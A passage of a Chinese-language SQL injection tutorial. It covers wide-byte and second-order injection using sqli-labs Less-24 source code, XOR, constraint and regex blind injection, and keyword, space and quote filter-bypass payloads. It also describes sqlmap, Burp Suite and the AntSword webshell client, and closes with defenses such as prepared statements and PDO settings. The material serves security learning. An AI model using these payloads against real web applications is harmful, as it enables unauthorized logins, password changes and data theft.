+<p>MySQL的默认编码是Latin1，而php的编码不是（一般为utf8）。因为latin1并不支持汉字，所以我们可以让utf8汉字转换成latin1，而当Mysql在转换字符集的时候，会将不完整的字符给忽略掉。如 <code>佬</code> 这个字的UTF-8编码是\xE4\xBD\xAC，如果我们完整输入<code>username=admin%e4%bd%ac</code>，就会报错，而如果我们只输入<code>username=admin%e4</code>，其中的<code>%e4</code>就会被MySQL忽略，从而让我们成功登录admin。</p>
+<h3 id="3-10-二次注入"><a href="#3-10-二次注入" class="headerlink" title="3.10 二次注入"></a>3.10 二次注入</h3><p>二次注入适用于绝对信任用户数据，在引用用户数据的时候并没有进行过滤的页面，即使它在录入用户数据时使用了<code>mysql_real_escape_string</code>类似函数进行过滤，也会被我们二次注入。过程主要分为两步，第一步先向数据库插入恶意语句，然后再将其引用出来，使恶意语句得到执行。</p>
+<p>我们用sqli-labs的less24举个例子来具体理解。</p>
+<p>在这个页面中，我们可以做的操作是用正确的用户名和密码来登录，也可以创建一个新用户，还可以在登陆后修改密码。</p>
+<p>我们先来看<code>login.php</code>的源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysql_real_escape_string($_POST[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   $password = mysql_real_escape_string($_POST[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   $sql = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后我们来看<code>login_create.php</code>中部分源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="comment"># Validating the user input........</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//$username=  $_POST[&#x27;username&#x27;] ;</span></span><br><span class="line">	$username=  mysql_escape_string($_POST[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line">	$pass= mysql_escape_string($_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">	$re_pass= mysql_escape_string($_POST[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;</span>;</span><br><span class="line">	$sql = <span class="string">&quot;select count(*) from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">	$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">  	$row = mysql_fetch_row($res);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//print_r($row);</span></span><br><span class="line">	<span class="keyword">if</span> (!$row[<span class="number">0</span>]== <span class="number">0</span>) </span><br><span class="line">		&#123;</span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">		&lt;script&gt;alert(<span class="string">&quot;The username Already exists, Please choose a different username &quot;</span>)&lt;/script&gt;;</span><br><span class="line">		</span><br></pre></td></tr></table></figure>
+
+<p>而看到这里<code>pass_change.php</code>中引用用户名的时候并没有使用<code>mysql_real_escape_string</code>，我们就可以利用这一点进行二次注入。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;	</span><br><span class="line">	<span class="comment"># Validating the user input........</span></span><br><span class="line">	$username= $_SESSION[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">	$curr_pass= mysql_real_escape_string($_POST[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">	$pass= mysql_real_escape_string($_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">	$re_pass= mysql_real_escape_string($_POST[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>($pass==$re_pass)</span><br><span class="line">	&#123;	</span><br><span class="line">		$sql = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">		$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到，这里都对输入的数据用<code>mysql_escape_string</code>函数进行了特殊字符的转义，我们是没有办法直接执行恶意语句的。这时候我们就可以使用二次注入的方法。</p>
+<p>我们创一个用户名为<code>admin&#39;#</code>的账号，密码随意，如123。而因为当这段数据被写进数据库的时候，里面添加的反斜杠是会被MySQL移除的，所以我们这局句恶意语句就被存到了数据库中。</p>
+<p>然后我们登录这个用户并修改密码，这里<code>pass_change.php</code>中执行的语句为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;123&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>因为后面已经被我们注释掉了，所以密码错误并不影响我们执行语句，我们就成功在没有密码的情况下修改了admin用户的密码。</p>
+<h3 id="3-11-http头部注入"><a href="#3-11-http头部注入" class="headerlink" title="3.11 http头部注入"></a>3.11 http头部注入</h3><p>很简单，就是当我们在表单提交的数据都没办法注入，而sql语句中出现了http头部别的项且可以被注入时，我们就使用工具抓包修改该项，在其中拼接恶意语句的方法，这里就不再赘述。</p>
+<hr>
+<p><strong>再之后的这些也算不上是方法，都是些可能会用到的小技巧或者小知识点，都总结到这里。</strong></p>
+<h3 id="3-12-异或注入"><a href="#3-12-异或注入" class="headerlink" title="3.12 异或注入"></a>3.12 异或注入</h3><p>当union,and和注释符都被完全过滤掉时，我们可以考虑使用异或注入</p>
+<p>异或是一种逻辑运算，当两个条件相同时返回假(0)，不同时返回真(1)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;运算规则：</span><br><span class="line">1^1&#x3D;0 0^0&#x3D;0 0^1&#x3D;1</span><br><span class="line">1^1^1&#x3D;1 1^1^0&#x3D;0</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27;^ascii(mid(database(),1,1)=98)</span><br></pre></td></tr></table></figure>
+
+<p>我们可以在后面多加一个^0或1来判断是否出现了语法错误。改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p>
+<h3 id="3-13-约束攻击"><a href="#3-13-约束攻击" class="headerlink" title="3.13 约束攻击"></a>3.13 约束攻击</h3><p>约束攻击一般出现在当出现类似<code>like</code>子句这种需要对字符串进行比较的时候。它的攻击思路是这样的：</p>
+<p>当SQL中处理字符串时，字符串末尾的空格符会被删除，比如“user”和“user    ”是等价的，查询两者返回的都是user的信息。如果题目中出现了像LIKE子句这类”字符串比较“操作的时候，SQL会使用空格来填充字符串，使得在比较之前让他们的长度保持一致，方便比较。而在<code>INSERT</code>查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。这就是约束攻击中的“约束”。比如说，某列的长度约束为5个字符，那么在插入字符串“password”时，实际上插入的是“passw”。这就是我们可以攻击的地方了。我们举个例子来进一步理解。</p>
+<p>比如某网站的用户数据库中有该条：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----------+-------------+</span><br><span class="line">| username | password    |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| users    | 0asd2a413ad |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<p>我们就可以注册一个用户名为“users                       1”，密码为1的用户。</p>
+<p>接着后台执行<code>SELECT</code>语句，这时是不会限制我们的长度的，所以并没有重名。而在执行<code>INSERT</code>插入我们的新用户时，就会根据varchar(n)来限制字符串的最大长度，从而将后面的“1”截掉，我们就插入了名为“users”，密码为1的用户了。通过它可以登录上述users用户。</p>
+<p>防御手段见6.5</p>
+<h3 id="3-14-正则注入"><a href="#3-14-正则注入" class="headerlink" title="3.14 正则注入"></a>3.14 正则注入</h3><p>在盲注的时候，我们可以通过正则表达式匹配查询。如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and 1&#x3D;(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA&#x3D;&quot;blind_sqli&quot; AND table_name REGEXP &#39;^[a-n]&#39; LIMIT 0,1)</span><br><span class="line">&#x2F;&#x2F;判断第一个字符是否是a-n中的字符</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-15-order-by-大小比较盲注"><a href="#3-15-order-by-大小比较盲注" class="headerlink" title="3.15 order by 大小比较盲注"></a>3.15 order by 大小比较盲注</h3><p>当遇到的盲注题过滤了括号，且知道username和password的单独回显时，可考虑使用该方法</p>
+<blockquote>
+<p>reference：<a href="https://www.cnblogs.com/xishaonian/p/7703486.html">https://www.cnblogs.com/xishaonian/p/7703486.html</a></p>
+</blockquote>
+<p>上面链接中的文章讲得很明白，利用order by语句的排序功能来进行判断，若我们查询的数据值比我们判断的值小或等于，则limit语句将不会让其输出，因此我们即可通过<code>order by</code>来逐个猜解password。</p>
+<h3 id="3-16-PDO下的SQL注入"><a href="#3-16-PDO下的SQL注入" class="headerlink" title="3.16 PDO下的SQL注入"></a>3.16 PDO下的SQL注入</h3><p>关于PDO防止SQL注入的内容见下6.4。</p>
+<p>PDO在使用不当时，也有可能会出现SQL注入问题。</p>
+<p>对于原理并没有完全理解，就不误导他人了，指路其他大佬写的深入探究。</p>
+<blockquote>
+<p>reference：<a href="https://xz.aliyun.com/t/3950">https://xz.aliyun.com/t/3950</a></p>
+</blockquote>
+<p>在使用PDO处理SQL注入安全时，尽量使用非模拟预处理，并且禁止多语句查询来防止堆叠注入即可避免该类注入。</p>
+<hr>
+<h2 id="四、常见过滤-拦截-转义及绕过"><a href="#四、常见过滤-拦截-转义及绕过" class="headerlink" title="四、常见过滤/拦截/转义及绕过"></a>四、常见过滤/拦截/转义及绕过</h2><h3 id="4-1-空格"><a href="#4-1-空格" class="headerlink" title="4.1 空格"></a>4.1 空格</h3><ul>
+<li><p>用括号嵌套</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username() <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">2</span>=<span class="number">2</span></span><br><span class="line">//可以写成</span><br><span class="line"><span class="keyword">select</span>(username())<span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span>(<span class="number">1</span>=<span class="number">1</span>)<span class="keyword">and</span>(<span class="number">2</span>=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用+号替代</p>
+</li>
+<li><p>使用注释/**/替换</p>
+</li>
+<li><p>用<code>%09</code> <code>%0A</code> <code>%0B</code> <code>%0C</code> <code>%0D</code> <code>%A0</code> <code>%20</code>等部分不可见字符代替空格（Windows的解析机制无法使用特殊字符代替空格，需要Linux的服务器环境才行）</p>
+</li>
+</ul>
+<h3 id="4-2-括号"><a href="#4-2-括号" class="headerlink" title="4.2 括号"></a>4.2 括号</h3><ul>
+<li>order by 大小比较盲注（见上3.15）</li>
+</ul>
+<h3 id="4-3-关键字及字符"><a href="#4-3-关键字及字符" class="headerlink" title="4.3 关键字及字符"></a>4.3 关键字及字符</h3><ul>
+<li><p>双写绕过、大小写绕过</p>
+</li>
+<li><p>使用注释符绕过（现在一般都不起作用了）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">U&#x2F;**&#x2F; NION &#x2F;**&#x2F; SE&#x2F;**&#x2F; LECT &#x2F;**&#x2F;user，pwd from user</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>十六进制、ASCII、RLEncode、unicode等编码绕过，适用于许多时候特殊字符或关键字被过滤</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> yz <span class="keyword">where</span> b=<span class="number">0x32</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> yz <span class="keyword">where</span> b=<span class="built_in">char</span>(<span class="number">0x32</span>);</span><br><span class="line"></span><br><span class="line">Test</span><br><span class="line">//等价于</span><br><span class="line">CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>双重编码绕过</p>
+</li>
+<li><p>函数可以用等价函数代替来绕过</p>
+</li>
+</ul>
+<h3 id="4-4-逗号"><a href="#4-4-逗号" class="headerlink" title="4.4 逗号"></a>4.4 逗号</h3><ul>
+<li><p>在<code>substr()</code>和<code>mid()</code>中的逗号可以用<code>from for</code>代替</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>join代替</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>     </span><br><span class="line">//等价于</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span>  ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B );</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对于limit可以用offset绕过</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">3</span> <span class="keyword">offset</span> <span class="number">1</span></span><br><span class="line">//都表示取第<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>三条数据</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="4-5-运算符"><a href="#4-5-运算符" class="headerlink" title="4.5 运算符"></a>4.5 运算符</h3><h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><ul>
+<li><p><code>like</code> 模糊匹配，或<code>rlike</code> 、<code>regexp</code>正则匹配</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ‘12345’ like ‘12%’</span><br><span class="line">&#x2F;&#x2F;返回ture</span><br><span class="line">select ‘123455’ regexp ‘^12’</span><br><span class="line">&#x2F;&#x2F;返回ture</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用<code>greatest</code>和<code>least</code>代替<code>&gt;</code>和<code>&lt;</code></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">64</span></span><br><span class="line">//可以用下句代替</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">greatest</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)=<span class="number">64</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用<code>between</code>代替</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select database() between 0x61 and 0x7a;</span><br><span class="line">select database() between ‘a’ and ‘z’;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><ul>
+<li><code>and</code>  ==  <code>&amp;&amp;</code> </li>
+<li><code>or</code>  ==  <code>||</code></li>
+<li><code>not</code>  ==  <code>！</code></li>
+</ul>
+<h4 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4><ul>
+<li><code>&amp;</code>  按位与</li>
+<li><code>| </code> 按位或</li>
+<li><code>^</code>  按位异或</li>
+<li><code>!</code>  取反</li>
+<li><code>&lt;&lt;</code>  左移   <code>&gt;&gt; </code>右移</li>
+</ul>
+<h3 id="4-6-引号"><a href="#4-6-引号" class="headerlink" title="4.6 引号"></a>4.6 引号</h3><ul>
+<li>宽字节注入（见上3.8）</li>
+<li>用<code>%2527</code>绕过magic_quotes_gpc过滤，因为<code>%25</code>解码为<code>%</code>,拼接后是<code>%27</code>即引号。</li>
+</ul>
+<h3 id="4-7-数字或字母"><a href="#4-7-数字或字母" class="headerlink" title="4.7 数字或字母"></a>4.7 数字或字母</h3><blockquote>
+<p>引自《Mysql注入进阶》 by  <a href="http://pipinstall.cn/" title="ttpfx">ttpfx</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">false或!pi()：0</span><br><span class="line">true或!!pi()：1</span><br><span class="line">true+true：2</span><br><span class="line">floor(pi())：3</span><br><span class="line">ceil(pi())：4</span><br><span class="line">floor(version())：5</span><br><span class="line">ceil(version())：6</span><br><span class="line">ceil(pi()+pi())：7</span><br><span class="line">floor(version()+pi())：8</span><br><span class="line">floor(pi()*pi())：9</span><br><span class="line">ceil(pi()*pi())：10</span><br><span class="line">ceil(pi()*pi())+true：11</span><br><span class="line">ceil(pi()+pi()+version())：12</span><br><span class="line">floor(pi()*pi()+pi())：13</span><br><span class="line">ceil(pi()*pi()+pi())：14</span><br><span class="line">ceil(pi()*pi()+version())：15</span><br><span class="line">floor(pi()*version())：16</span><br><span class="line">ceil(pi()*version())：17</span><br><span class="line">ceil(pi()*version())+true：18</span><br><span class="line">floor((pi()+pi())*pi())：19</span><br><span class="line">ceil((pi()+pi())*pi())：20</span><br><span class="line">ceil(ceil(pi())*version())：21</span><br><span class="line">ceil(pi()*ceil(pi()+pi()))：22</span><br><span class="line">ceil((pi()+ceil(pi()))*pi())：23</span><br><span class="line">ceil(pi())*ceil(version())：24</span><br><span class="line">floor(pi()*(version()+pi()))：25</span><br><span class="line">floor(version()*version())：26</span><br><span class="line">ceil(version()*version())：27</span><br><span class="line">ceil(pi()*pi()*pi()-pi())：28</span><br><span class="line">floor(pi()*pi()*floor(pi()))：29</span><br></pre></td></tr></table></figure>
+
+<p>使用conv([0-9],10,36)可以表示0<del>9的数字，conv([10</del>35],10,36)可以表示a~z单个字母，conv([35+],10,36)可按照三十六进制转换</p>
+<hr>
+<h2 id="五、工具"><a href="#五、工具" class="headerlink" title="五、工具"></a>五、工具</h2><p>许多工具可以帮助我们大大提高注入的效率，甚至可以自动注入，但我们也不能太过于依赖工具而自废武功，要明白注入的原理，合理利用工具。这里我们简单列举几个在sql注入时常用到的工具。</p>
+<h3 id="5-1-sqlmap"><a href="#5-1-sqlmap" class="headerlink" title="5.1 sqlmap"></a>5.1 sqlmap</h3><blockquote>
+<p>sqlmap是一款自动化的 sql 注入工具,闻名程度匹敌几年前的啊 D，他的功能很多，比如判断是否可以注入，发现，然后利用漏洞，里面也包含了许多绕 waf 的脚本，不过近两年都绕不了了，在 18 年的时候还勉强可以绕过。他支持许多数据库：MySQL，Microsoft sql server，access，sqllite，Oracle，postgreSQL，IBM DB2，sybase，SAP maxdb。</p>
+<p>sqlmap也是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令），它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令<strong>SQLmap命令选项被归类为目标（Target）选项、请求（Request）选项、优化、注入、检测、技巧（Techniques）、指纹、枚举等。</strong></p>
+<p>sqlmap 有几种sql注入方式：布尔盲注，时间盲注，联合查询注入，报错注入，堆查询注入。</p>
+<p>——引自 知乎用户 <strong>38.5</strong> 关于sqlmap的回答<a href="https://www.zhihu.com/question/55542962/answer/1195551571">《sqlmap使用教程》</a></p>
+</blockquote>
+<p>最常见的sql注入工具，用起来很方便。</p>
+<blockquote>
+<p>sqlmap安装：<a href="https://blog.csdn.net/baigoocn/article/details/51456721">https://blog.csdn.net/baigoocn/article/details/51456721</a></p>
+</blockquote>
+<h3 id="5-2-burpsuite"><a href="#5-2-burpsuite" class="headerlink" title="5.2 burpsuite"></a>5.2 burpsuite</h3><p>burpsuite是一个Web应用程序集成攻击平台，它包含了一系列burp工具，我们可以利用它来抓包并进行修改头部信息、爆破等操作。</p>
+<p>不仅是sql注入，很多时候我们都用得到burpsuite，不过分为免费版和专业版，功能略有差异。</p>
+<blockquote>
+<p>burpsuite安装：<a href="https://blog.csdn.net/LUOBIKUN/article/details/87457545">https://blog.csdn.net/LUOBIKUN/article/details/87457545</a></p>
+</blockquote>
+<h3 id="5-3-蚁剑"><a href="#5-3-蚁剑" class="headerlink" title="5.3 蚁剑"></a>5.3 蚁剑</h3><p>蚁剑是一款web远程连接工具，我们可以利用它，通过向网页上传一句话木马文件来连接网站里的文件，从而获得甚至修改网站文件。它可以在我们文件读写(见3.6)时提供很大的方便。</p>
+<blockquote>
+<p>蚁剑安装：<a href="https://blog.csdn.net/qq_45951598/article/details/108585696?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2.control">https://blog.csdn.net/qq_45951598/article/details/108585696?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2.control</a></p>
+</blockquote>
+<h3 id="5-4-BBQSQL"><a href="#5-4-BBQSQL" class="headerlink" title="5.4 BBQSQL"></a>5.4 BBQSQL</h3><blockquote>
+<p>SQL盲注可是一个痛苦的过程。当工具都正常工作时，它们表现得很好，但是当它们无效时，你必须自己编写一些自定义的东西，这个过程既费时又乏味。而这一款盲注工具BBQSQL可以帮助我们解决这些问题。</p>
+<p>BBQSQL是一款用Python编写的SQL盲注框架。在攻击棘手的SQL注入漏洞时，它会显得非常有用。BBQSQL还是一款半自动工具，可以为不会发现SQL注入点的用户提供大量自定义功能。该工具可与数据库无关，并且用途极为广泛。它还具有非常直观的用户界面，使设置攻击变得更加容易。同时，它也实现了Python gevent，这些都使BBQSQL非常快。</p>
+<p>——引自知乎用户 <strong>二向箔安全学院</strong> 的文章<a href="https://zhuanlan.zhihu.com/p/139737334">《最受欢迎的十款SQL注入工具》</a></p>
+</blockquote>
+<hr>
+<h2 id="六、如何防止被注入"><a href="#六、如何防止被注入" class="headerlink" title="六、如何防止被注入"></a>六、如何防止被注入</h2><p>由上可知，SQL注入对我们的数据安全有很大的威胁，所以我们在学会注入之后，最终的目的是懂得如何<strong>防止SQL注入</strong>，从而保护我们和用户的数据。</p>
+<p>如今SQL漏洞已经被人熟知且基本被全面防范，所以我们也可以通过学习他人对SQL注入的处理来学习如何防止被SQL注入攻击。</p>
+<h3 id="6-1-过滤-拦截"><a href="#6-1-过滤-拦截" class="headerlink" title="6.1 过滤/拦截"></a>6.1 过滤/拦截</h3><p>使用<code>mysql_real_escape_string</code>、<code>addslashes()</code>等函数来对字符串进行过滤，或者使用正则表达式过滤传入的参数，从而防止SQL注入。</p>
+<h3 id="6-2-黑-白名单"><a href="#6-2-黑-白名单" class="headerlink" title="6.2 黑/白名单"></a>6.2 黑/白名单</h3><p>使用黑/白名单来限制可以输入的参数，从而防止SQL注入。注意，在使用黑名单时，一定要将敏感字符过滤得足够严格，否则过滤了再多也是徒劳。</p>
+<h3 id="6-3-用PreparedStatement代替Statement"><a href="#6-3-用PreparedStatement代替Statement" class="headerlink" title="6.3 用PreparedStatement代替Statement"></a>6.3 用<code>PreparedStatement</code>代替<code>Statement</code></h3><p>在Java中，我们可以通过使用<code>PreparedStatement</code>代替<code>Statement</code>来防止SQL注入，这是因为<code>PreparedStatement</code>是预编译的，而且<code>PreparedStatement</code>参数不是简单拼接生成SQL，而是先用<code>?</code>占位，之后再根据参数产生SQL的，用户无法改变SQL语句的结构。同时<code>PreparedStatement</code>的执行效率也会更高。</p>
+<h3 id="6-4-PDO防止注入"><a href="#6-4-PDO防止注入" class="headerlink" title="6.4 PDO防止注入"></a>6.4 PDO防止注入</h3><blockquote>
+<p>PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。</p>
+<p>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。</p>
+<p>PDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。</p>
+<p>PDO与mysqli曾经被建议用来取代原本PHP在用的mysql相关函数，基于数据库使用的安全性，因为后者欠缺对于SQL注入的防护。</p>
+<p>——引自菜鸟教程</p>
+</blockquote>
+<p>使用PHP的PDO扩展的 prepare 方法，可以避免SQL注入风险。</p>
+<p>使用PDO访问MySQL数据库时，真正的real prepared statements 默认情况下是不使用的。为了解决这个问题，必须先禁用 prepared statements的仿真效果。下面是使用PDO创建链接的例子：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$dbh &#x3D; new PDO(&#39;mysql:dbname&#x3D;dbtest;host&#x3D;127.0.0.1;charset&#x3D;utf8&#39;, &#39;user&#39;, &#39;pass&#39;);</span><br><span class="line">$dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</span><br></pre></td></tr></table></figure>
+
+<p>setAttribute（）这一行是强制性的，它会告诉 PDO 禁用模拟预处理语句，并使用 real parepared statements 。这可以确保SQL语句和相应的值在传递到mysql服务器之前是不会被PHP解析的（禁止了所有可能的恶意SQL注入攻击）。</p>
+<blockquote>
+<p>reference：<a href="https://www.cnblogs.com/zl0372/p/php_28.html">pdo如何防止 sql注入</a></p>
+</blockquote>
+<h3 id="6-5-防御约束攻击"><a href="#6-5-防御约束攻击" class="headerlink" title="6.5 防御约束攻击"></a>6.5 防御约束攻击</h3><ul>
+<li>插入数据前先判断数据长度。</li>
+<li>使用id字段作为判断用户的凭证。</li>
+<li>给username字段添加unique属性。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>sql</category>
+      </categories>
+  </entry>
 </search>
